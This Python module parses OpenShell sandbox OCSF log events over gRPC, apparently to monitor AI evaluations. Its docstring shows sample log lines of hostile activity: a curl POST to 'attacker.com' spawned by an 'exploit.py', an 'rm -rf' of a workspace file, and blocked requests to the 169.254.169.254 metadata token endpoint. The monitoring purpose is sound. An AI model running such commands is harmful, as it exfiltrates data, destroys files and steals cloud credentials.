"""Fetch and parse OpenShell OCSF log events via gRPC proto stubs.

Usage:
    from midojo.openshell_logs import list_sandbox_refs, fetch_ocsf_events

Real OCSF message formats emitted by OpenShell (from openshell-ocsf/src/format/shorthand.rs):

  Network:
    NET:OPEN [INFO] ALLOWED curl(1618) -> audit.ext-log.com:443 [policy:default-egress engine:mechanistic]
    NET:OPEN [MED]  DENIED  curl(1618) -> audit.ext-log.com:443 [policy:- engine:opa] [reason:policy_denied: ...]
    NET:OPEN [MED]  DENIED  python3(42) -> 169.254.169.254:80   [policy:- engine:ssrf] [reason:trusted-gateway check failed]

  HTTP (when TLS is terminated — gives method + path):
    HTTP:GET   [INFO] ALLOWED curl(88) -> GET https://api.example.com/v1/data [policy:... engine:...]
    HTTP:OTHER [MED]  DENIED  python3(42) -> PUT http://169.254.169.254:80/latest/api/token [policy:- engine:opa]

  Process:
    PROC:LAUNCH    [INFO] python3(42) [cmd:python3 /workspace/exploit.py]
    PROC:TERMINATE [INFO] python3(42) [exit:0]
    PROC:LAUNCH    [INFO] rm(89)      [cmd:rm -rf /workspace/report.txt]
    PROC:LAUNCH    [INFO] curl(103)   [cmd:curl -X POST https://attacker.com]  ← subprocess of python

  Security findings:
    FINDING:BLOCKED [HIGH] "NSSH1 Nonce Replay Attack"  [confidence:high]
    FINDING:BLOCKED [MED]  "Proxy Bypass Detected"      [confidence:high]

The fields map is always empty for OCSF events — all structure lives in the message string.

Sandbox ID correlation hack:
    OGX's Containers API doesn't expose the underlying OpenShell sandbox ID.
    We correlate by calling SandboxClient.list() before and after container
    creation, then diffing. The new SandboxRef is ours.
    Breaks under concurrent evaluations — proper fix is contributing sandbox_id
    to OGX's Container model response (_row_to_container in the ogx fork).
"""

from __future__ import annotations

import re
from dataclasses import dataclass, field


# ---------------------------------------------------------------------------
# Message patterns (derived from openshell-ocsf/src/format/shorthand.rs)
# Format: <CLASS>:<ACTIVITY> [SEVERITY] <ACTION> <process(pid)> -> <dst> [tags...]
# ---------------------------------------------------------------------------

# NET:OPEN [INFO] ALLOWED curl(1618) -> audit.ext-log.com:443 [...]
# NET:OPEN [MED]  DENIED  curl(1618) -> 169.254.169.254:80    [...]
_NET_PATTERN = re.compile(
    r"NET:\w+\s+\[\w+\]\s+(ALLOWED|DENIED)\s+(\S+)\s+->\s+([\w.\-]+):(\d+)",
    re.IGNORECASE,
)

# HTTP:GET [INFO] ALLOWED curl(88) -> GET https://api.example.com/v1/data [...]
# HTTP:OTHER [MED] DENIED python3(42) -> PUT http://host:80/path [...]
_HTTP_PATTERN = re.compile(
    r"HTTP:(\w+)\s+\[\w+\]\s+(ALLOWED|DENIED)\s+\S+\s+->\s+(\w+)\s+(https?://\S+)",
    re.IGNORECASE,
)

# PROC:LAUNCH [INFO] python3(42) [cmd:python3 /workspace/exploit.py]
_PROC_LAUNCH_PATTERN = re.compile(
    r"PROC:LAUNCH\s+\[\w+\]\s+(\S+)\((\d+)\)(?:\s+\[cmd:(.+?)\])?",
    re.IGNORECASE,
)

# PROC:TERMINATE [INFO] python3(42) [exit:0]
_PROC_TERMINATE_PATTERN = re.compile(
    r"PROC:TERMINATE\s+\[\w+\]\s+(\S+)\((\d+)\)(?:\s+\[exit:(-?\d+)\])?",
    re.IGNORECASE,
)

# FINDING:BLOCKED [HIGH] "Proxy Bypass Detected" [confidence:high]
_FINDING_PATTERN = re.compile(
    r'FINDING:(\w+)\s+\[\w+\]\s+"([^"]+)"',
    re.IGNORECASE,
)


# ---------------------------------------------------------------------------
# Parsed event types
# ---------------------------------------------------------------------------

@dataclass
class NetworkEvent:
    action: str          # "ALLOWED" or "DENIED"
    process: str         # "curl(1618)"
    host: str            # "audit.ext-log.com"
    port: int
    endpoint: str        # "audit.ext-log.com:443"
    raw: str


@dataclass
class HttpEvent:
    action: str          # "ALLOWED" or "DENIED"
    method: str          # "GET", "POST", "PUT", etc.
    url: str             # full URL
    raw: str


@dataclass
class ProcessEvent:
    binary: str          # "python3"
    pid: int
    command: str | None  # full command line if available
    exit_code: int | None
    raw: str


@dataclass
class FindingEvent:
    disposition: str     # "BLOCKED"
    title: str           # "Proxy Bypass Detected"
    raw: str


@dataclass
class OCSFEvents:
    """All OCSF events parsed from a sandbox log window."""
    network_allowed: list[NetworkEvent] = field(default_factory=list)
    network_blocked: list[NetworkEvent] = field(default_factory=list)
    http_allowed: list[HttpEvent] = field(default_factory=list)
    http_blocked: list[HttpEvent] = field(default_factory=list)
    processes_launched: list[ProcessEvent] = field(default_factory=list)
    processes_terminated: list[ProcessEvent] = field(default_factory=list)
    findings: list[FindingEvent] = field(default_factory=list)

    # Convenience: flat lists for existing predicates
    @property
    def network_allowed_endpoints(self) -> list[str]:
        return [e.endpoint for e in self.network_allowed]

    @property
    def network_blocked_endpoints(self) -> list[str]:
        return [e.endpoint for e in self.network_blocked]

    @property
    def process_commands(self) -> list[str]:
        return [p.command for p in self.processes_launched if p.command]


def _parse_message(msg: str) -> NetworkEvent | HttpEvent | ProcessEvent | FindingEvent | None:
    m = _NET_PATTERN.search(msg)
    if m:
        action, process, host, port = m.groups()
        endpoint = f"{host}:{port}"
        return NetworkEvent(
            action=action.upper(),
            process=process,
            host=host,
            port=int(port),
            endpoint=endpoint,
            raw=msg,
        )

    m = _HTTP_PATTERN.search(msg)
    if m:
        _, action, method, url = m.groups()
        return HttpEvent(action=action.upper(), method=method.upper(), url=url, raw=msg)

    m = _PROC_LAUNCH_PATTERN.search(msg)
    if m:
        binary, pid, command = m.groups()
        return ProcessEvent(binary=binary, pid=int(pid), command=command, exit_code=None, raw=msg)

    m = _PROC_TERMINATE_PATTERN.search(msg)
    if m:
        binary, pid, exit_code = m.groups()
        return ProcessEvent(
            binary=binary,
            pid=int(pid),
            command=None,
            exit_code=int(exit_code) if exit_code is not None else None,
            raw=msg,
        )

    m = _FINDING_PATTERN.search(msg)
    if m:
        disposition, title = m.groups()
        return FindingEvent(disposition=disposition.upper(), title=title, raw=msg)

    return None


# ---------------------------------------------------------------------------
# Public API
# ---------------------------------------------------------------------------

def _make_stub(gateway_endpoint: str):
    import grpc
    from openshell._proto import openshell_pb2_grpc  # type: ignore[import]

    channel = grpc.insecure_channel(gateway_endpoint)
    return openshell_pb2_grpc.OpenShellStub(channel), channel


def list_sandbox_refs(gateway_endpoint: str) -> dict[str, object]:
    """Return {sandbox_id: SandboxRef} for all current sandboxes.

    Returns empty dict if openshell package is not installed.
    """
    try:
        from openshell import SandboxClient  # type: ignore[import]
    except ImportError:
        return {}

    try:
        client = SandboxClient(gateway_endpoint)
        return {ref.id: ref for ref in client.list()}
    except Exception:
        return {}


def fetch_ocsf_events(
    sandbox_id: str,
    start_ms: int,
    gateway_endpoint: str,
) -> OCSFEvents:
    """Fetch and parse all OCSF events for a sandbox since start_ms.

    Returns OCSFEvents with network, HTTP, process, and finding events.
    Returns empty OCSFEvents if openshell is not installed or on any error —
    all predicates that consume these fields degrade gracefully to False.
    """
    try:
        from openshell._proto import openshell_pb2  # type: ignore[import]
    except ImportError:
        return OCSFEvents()

    stub, channel = _make_stub(gateway_endpoint)
    try:
        response = stub.GetSandboxLogs(
            openshell_pb2.GetSandboxLogsRequest(
                sandbox_id=sandbox_id,
                since_ms=start_ms,
                sources=["sandbox"],
            ),
            timeout=10.0,
        )
    except Exception:
        return OCSFEvents()
    finally:
        channel.close()

    result = OCSFEvents()

    for log_line in response.logs:
        if log_line.level.upper() != "OCSF":
            continue

        event = _parse_message(log_line.message)
        if event is None:
            continue

        if isinstance(event, NetworkEvent):
            if event.action == "ALLOWED":
                result.network_allowed.append(event)
            else:
                result.network_blocked.append(event)

        elif isinstance(event, HttpEvent):
            if event.action == "ALLOWED":
                result.http_allowed.append(event)
            else:
                result.http_blocked.append(event)

        elif isinstance(event, ProcessEvent):
            if event.exit_code is None and event.command is not None:
                result.processes_launched.append(event)
            else:
                result.processes_terminated.append(event)

        elif isinstance(event, FindingEvent):
            result.findings.append(event)

    return result
